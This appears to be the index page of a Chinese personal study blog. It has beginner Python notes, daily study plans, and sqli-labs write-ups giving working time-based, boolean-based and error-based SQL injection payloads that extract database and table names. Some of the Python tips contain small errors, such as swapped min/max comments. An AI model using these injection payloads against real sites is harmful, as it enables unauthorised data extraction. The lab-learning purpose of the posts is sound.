<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Here recording my growth of technology and hope you can gain something here."><meta name="keywords" content=""><meta name="author" content="George"><meta name="copyright" content="George"><title>Welcome to my blog. | A.</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">92</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">16</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">python注意事项</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-12</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/python/">python</a></span><div class="content"><ol>
<li><p>如要在字符串中使用引号，则包裹字符串要用双引号，单引号不可。如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;George&#39;s personality is very optimistic!&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>变量打印时如要换行要用加号，与c语言有差别。如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(name + &quot;\n\t&quot;)   &#x2F;&#x2F;python</span><br><span class="line">printf(&quot;&amp;d\n\t&quot;,name)    &#x2F;&#x2F;C语言</span><br></pre></td></tr></table></figure>
</li>
<li><p>str()函数将非字符串转为字符串以正常打印。如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age &#x3D; 23 </span><br><span class="line">message &#x3D; &quot;Happy &quot; + str(age) + &quot;rd Birthday!&quot; </span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure>
</li>
<li><p>列表中name[-1]可访问最后一个元素。</p>
</li>
<li><p>变量，列表值都不要加双引号，加了引号代表字符串，直接字面打印其中内容。</p>
</li>
<li><p>在对列表进行增删时一定要注意一个顺序性，即你如果删除了name[0]，原来的name[1]就变成了name[0]。</p>
</li>
<li><p>字典里哪怕嵌套的是字典，第一个字典内都要用冒号，而非等号；而且每一个键-值后记得加逗号！<img src="/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/1.png" alt="1"></p>
</li>
<li><p>遍历字典的键-值时，一定要记得加.item()</p>
</li>
<li><p>如果想引用特定函数（from。。。import。。。），要在不想引用部分加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br></pre></td></tr></table></figure>
</li>
<li><pre><code>import xxx</code></pre><p>时，在引用类的时候记得要用   xxx.方法/属性！</p>
<p><img src="/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/2.png" alt="2"></p>
</li>
<li></li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/12/python%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/">python的一些简单方法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-12</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/python/">python</a></span><div class="content"><h3 id="去除空白"><a href="#去除空白" class="headerlink" title="去除空白"></a>去除空白</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rstrip()   &#x2F;&#x2F;去除尾部空白</span><br><span class="line">lstrip()   &#x2F;&#x2F;去除头部空白</span><br><span class="line">strip()    &#x2F;&#x2F;去除头尾空白</span><br></pre></td></tr></table></figure>



<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name.title()   &#x2F;&#x2F;首字母大写</span><br><span class="line">name.upper()   &#x2F;&#x2F;全部大写</span><br><span class="line">name.lower()   &#x2F;&#x2F;全部小写</span><br></pre></td></tr></table></figure>



<h3 id="对列表的插入与删除"><a href="#对列表的插入与删除" class="headerlink" title="对列表的插入与删除"></a>对列表的插入与删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name.append(&#39;a&#39;)   &#x2F;&#x2F;在列表末尾添加元素a</span><br><span class="line">name.insert(0,&#39;a&#39;) &#x2F;&#x2F;在列表0位置添加元素a</span><br><span class="line">del name[0]        &#x2F;&#x2F;删除列表0位置元素</span><br></pre></td></tr></table></figure>

<h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">motorcycles &#x3D; [&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;]  </span><br><span class="line">print(motorcycles) </span><br><span class="line"></span><br><span class="line">popped_motorcycle &#x3D; motorcycles.pop()</span><br><span class="line">print(motorcycles) </span><br><span class="line">print(popped_motorcycle)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;] </span><br><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;] </span><br><span class="line">suzuki</span><br></pre></td></tr></table></figure>

<p>pop中添加数字即可添加元素到任何位置</p>
<h4 id="根据值删除元素"><a href="#根据值删除元素" class="headerlink" title="根据值删除元素"></a>根据值删除元素</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">motorcycles &#x3D; [&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;, &#39;ducati&#39;]  print(motorcycles) </span><br><span class="line">too_expensive &#x3D; &#39;ducati&#39; </span><br><span class="line"></span><br><span class="line">motorcycles.remove(too_expensive)  </span><br><span class="line">print(motorcycles) </span><br><span class="line">print(&quot;\nA &quot; + too_expensive.title() + &quot; is too expensive for me.&quot;)</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;, &#39;ducati&#39;] </span><br><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;] </span><br><span class="line">A Ducati is too expensive for me.</span><br></pre></td></tr></table></figure>



<h3 id="组织列表"><a href="#组织列表" class="headerlink" title="组织列表"></a>组织列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list.sort()   &#x2F;&#x2F;对列表进行永久性排序（a-z）</span><br><span class="line">list.sort(reverse&#x3D;true)   &#x2F;&#x2F;对列表进行永久性倒叙排序（z-a）</span><br><span class="line">sorted(list)   &#x2F;&#x2F;对列表进行临时性排序</span><br><span class="line"></span><br><span class="line">list.reverse()   &#x2F;&#x2F;倒着打印列表(这玩意有点奇妙，你不能把它放print里面，像print(list.reverse())</span><br><span class="line"></span><br><span class="line">len(list)   &#x2F;&#x2F;获取列表的长度(记得打印)</span><br></pre></td></tr></table></figure>



<h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">range(start_num,finish_num,step)</span><br><span class="line">list()   &#x2F;&#x2F;将括号内转化为列表</span><br></pre></td></tr></table></figure>



<h3 id="处理一堆数字的列表"><a href="#处理一堆数字的列表" class="headerlink" title="处理一堆数字的列表"></a>处理一堆数字的列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">min()   &#x2F;&#x2F;最大值</span><br><span class="line">max()   &#x2F;&#x2F;最小值</span><br><span class="line">sum()   &#x2F;&#x2F;总和</span><br></pre></td></tr></table></figure>



<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set()    &#x2F;&#x2F;去除其中重复值</span><br></pre></td></tr></table></figure>



<h3 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name.split()    &#x2F;&#x2F;以空格为界限，把字符串分割成若干块并放入列表</span><br></pre></td></tr></table></figure>



<h3 id="判断字符类型"><a href="#判断字符类型" class="headerlink" title="判断字符类型"></a>判断字符类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isinstance(string,type)    &#x2F;&#x2F;判断string是否是type类型，返回布尔值</span><br><span class="line">isdigit(string)            &#x2F;&#x2F;判断字符串是否为数字</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/12/2020-02-12%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-12日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-12</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-12"><a href="#2020-02-12" class="headerlink" title="2020-02-12"></a>2020-02-12</h2><table>
<thead>
<tr>
<th>10：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>10：30-12：00</td>
<td>python</td>
</tr>
<tr>
<td>12：00-lunchtime</td>
<td>数学通识+看看书</td>
</tr>
<tr>
<td>15：00-16：00</td>
<td>sql-labs 9-10</td>
</tr>
<tr>
<td>18：30-20：30</td>
<td>python</td>
</tr>
<tr>
<td></td>
<td>php</td>
</tr>
<tr>
<td></td>
<td>上床</td>
</tr>
</tbody></table>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/11/sql%E6%97%B6%E9%97%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/">sql时间型注入</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-11</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/sql/">sql</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span><div class="content"><p>今天遇到了sql时间型注入，大致总结一下，其实和布尔型注入非常相似，只不过利用了sleep（）函数对网页延迟的影响来判断正误。</p>
<p>比如判断是否存在漏洞时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and sleep(5)--+</span><br></pre></td></tr></table></figure>

<p>判断数据库长度时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and if(length(database())&#x3D;8,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

<p>判断数据库字母时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and if(ascii(substr((select database()),1,1))&gt;113,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/11/2020-02-11%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-11日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-11</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-11日目标"><a href="#2020-02-11日目标" class="headerlink" title="2020-02-11日目标"></a>2020-02-11日目标</h2><ol>
<li>sqli-labs往后做</li>
<li>python的书看起来</li>
<li>数学通识2-3</li>
<li>单词20个</li>
<li>听力10min</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/10/sql%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/">sql布尔型注入</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-10</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/sql/">sql</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span><div class="content"><p>做到了sqli-labs的第六题，其实对比第五题只要改成了“即可，但是网上介绍了一种新的方法叫布尔型注入，这种方法emmm有点麻烦不太方便，但是容易理解，也多了解一条路子嘛。</p>
<p>总结一下来说，布尔型注入就是构造条件句，然后通过页面是否返回内容来判断构造条件是否满足。</p>
<p>比如一开始爆库名时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; and substr(database(),1,1)&gt;&#39;a&#39;</span><br></pre></td></tr></table></figure>

<p>利用不停改变a确定数据库第一个字母的值（可用二分法），接着爆出数据库名的长度，例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; and length(database())&#x3D;&#39;8&#39;</span><br></pre></td></tr></table></figure>

<p>然后一个字母一个字母爆出整个库名</p>
<p>接着爆出表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; and substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1,1)&#x3D;&#39;u&#39;</span><br></pre></td></tr></table></figure>

<p>limit 3,1 代表数据库里第4张表（第一张表是0）</p>
<p>如果大致能确定出表名，可这样确认猜测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; and substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1,5)&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>



<p>接下来的原理类似就不赘述。总之这种办法比较累人，不到万不得已建议还是用报错型注入。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/09/2020-02-10%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-10日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-09</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-10日目标"><a href="#2020-02-10日目标" class="headerlink" title="2020-02-10日目标"></a>2020-02-10日目标</h2><ol>
<li>英语听力10min</li>
<li>单词20个</li>
<li>数学通识2-3</li>
<li>sqli-labs继续刷</li>
<li>刷道wechall</li>
<li>开始接触python</li>
</ol>
<h2 id="2020-02-09总结"><a href="#2020-02-09总结" class="headerlink" title="2020-02-09总结"></a>2020-02-09总结</h2><p>讲真，今天一天，都在忙sqli-labs的less5，从一开始看答案的一脸懵逼，到后来一步步拆解分析，再到晚上甚至对答案提出了质疑，之后再深入思考又发现我质疑的点有不严密的地方，但是其中有一个点完全是答案可以改善的，也在原作者博客下评论了，希望那位大佬能注意到。总之，很奇妙的感觉，就像是思维的一场碰撞，不仅限于我和别人，也可以是现在的自己和以前的自己。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/">sql报错型注入</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-09</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/sql/">sql</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span><div class="content"><h2 id="对于原作者代码地理解"><a href="#对于原作者代码地理解" class="headerlink" title="对于原作者代码地理解"></a>对于原作者代码地理解</h2><p>今天做了sqli-labs的less5，第一次遇到这种报错型注入，就想好好研究下。</p>
<p>先来看这一段代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x) as a)--+</span><br></pre></td></tr></table></figure>

<p>第一眼看到的时候就懵了，然后想慢慢拆解下来看。我先把它放到word里，然后把每个括号都标上不同的序号和颜色：</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
<p>然后一段段看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. (select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1)</span><br></pre></td></tr></table></figure>

<p>这一段代表从表information_schema.schemata中提取schema_name字段的第一个记录数并在其后加上分号”;”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2. floor(rand()*2)</span><br></pre></td></tr></table></figure>

<p>rand()代表在0-1之间取随机数，而rand()*2则表示在0-2之间取随机数，floor代表取整，合在一起就代表在随机取0或1.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3. concat(1., 2.) as x</span><br></pre></td></tr></table></figure>

<p>代表将1.与2.连接并填写入一个新的字段x中。例如test0与test1填写到x字段中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4. (select count(*),3. from information_schema.tables group by x)</span><br></pre></td></tr></table></figure>

<p>3.中的字符已确定，此串代码的意思是统计出information_schema.tables表中的行数，并给每一行的数据随机分配一个“名字”（test0，test1）。</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/2.png" alt="2"></p>
<p><strong>注：重点来了重点来了！</strong></p>
<p>如果仅仅是这样，你可能会问，这不很正常嘛，哪里有错误回显？</p>
<p>别急，如果我把这段代码原封不动再打一遍，可能会出现如下情况：</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/3.png" alt="3"></p>
<p>仔细观察发现两次输入完全一样，但为什么会报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &#39;information_schema0&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure>

<p>这个要理解透彻对我有些难度，需要理解数据库一些语句的运行机制。</p>
<p>在网上搜到了一篇不错的理解：<a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">点我</a></p>
<p>我大概转述一下他的意思：</p>
<p>我们先假设floor(rand()*2)函数连续五次的取值为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0，1，1，0，1</span><br></pre></td></tr></table></figure>

<p>刚开始的时候虚拟表是空的</p>
<table>
<thead>
<tr>
<th>count（*）</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>扫描原始表第一项时，第一次计算取到了information_schema0，到x里寻找显然没有，于是要将它插入表中。</p>
<p><strong>但要记住！在插入之前会进行第二次计算</strong>，这时x的值就变成了information_schema1，于是乎表就变成了</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>information_schema1</td>
</tr>
</tbody></table>
<p>扫描原始表第二项时，得到information_schema1，到x里寻找能找到，于是乎表变成了</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>information_schema1</td>
</tr>
</tbody></table>
<p>接着扫描原始表第三项，计算得到information_schema0，到x里寻找显然没有，于是要将它插入表中，进行第二次计算得到information_schema1。</p>
<p>这时数据表就一脸懵逼，不是有了information_schema1嘛，于是它就报错。也就通过错误回显得到了我们想要的信息。</p>
<blockquote>
<p>还要注意一点，如果想要稳定地报错，可以使用rand（0）.</p>
</blockquote>
<p>到这里有人可能还会疑惑，这不就已经能错误回显了吗，为什么前面还会有select1</p>
<p>我们再仔细看这个代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+</span><br></pre></td></tr></table></figure>

<p>id=2‘ 和后面连接用的是and，如果没有select1，会发现两部分没有交集，无法成立，也就看不到回显了。</p>
<h2 id="对原作者码地质疑"><a href="#对原作者码地质疑" class="headerlink" title="对原作者码地质疑"></a>对原作者码地质疑</h2><p>按照原作者的意思这段码用<code>limit0，1</code>改变第一个数字的值而不断爆出数据库名</p>
<p>他给出了以下解释</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/4.png" alt="4"></p>
<p>其实我不了解group_concat()函数最大的字节数什么的，但经过测试我发现问题在于rand()应该改为rand(0)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor (rand(0)*2)) as x from information_schema.tables group by x) as a) --+</span><br></pre></td></tr></table></figure>

<p>这段代码完全可以爆出所有的库名</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/5.png" alt="5"></p>
<p>至于不加0为什么会得到</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/6.png" alt="6"></p>
<p>因为and后的语句查询结果为</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/7.png" alt="7"></p>
<p>而and前只有一行，后面的语句超过了一行所以报错。</p>
<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>再仔细一想，是我的问题，因为虽然可以爆出部分库名，但因为字节的限制不能显示所有库名，但rand（0）的改进没有任何问题！</p>
<p>所有最后代码就变成了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/07/2020-02-08%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-08日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-07</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-08日目标"><a href="#2020-02-08日目标" class="headerlink" title="2020-02-08日目标"></a>2020-02-08日目标</h2><ol>
<li>英语听力10min</li>
<li>数学通识2-3篇</li>
<li>英语单词20个</li>
<li>sqli-labs往后刷题</li>
<li>http协议最后一章带着看</li>
<li>如果有时间可以开始肝python了</li>
</ol>
<h2 id="2020-02-07总结"><a href="#2020-02-07总结" class="headerlink" title="2020-02-07总结"></a>2020-02-07总结</h2><p>今天先学完了AJAX，之后上wechall刷了两道题，通过regex那题又温习了一遍正则表达式，明天要早起了不能这么浑浑噩噩了！哦对，还看了本书《呼啸山庄》，讲真，最后结尾有点没看懂。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/">AJAX基础</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-07</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/AJAX/">AJAX</a></span><div class="content"><h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>AJAX = 异步 JavaScript 和 XML。</p>
<p>AJAX 是一种用于创建快速动态网页的技术。</p>
<p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现<strong>异步更新</strong>。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<p>传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。</p>
<p>有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。</p>
<p><img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/1.png" alt="1"></p>
<h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>先放一段完整的代码感受下</p>
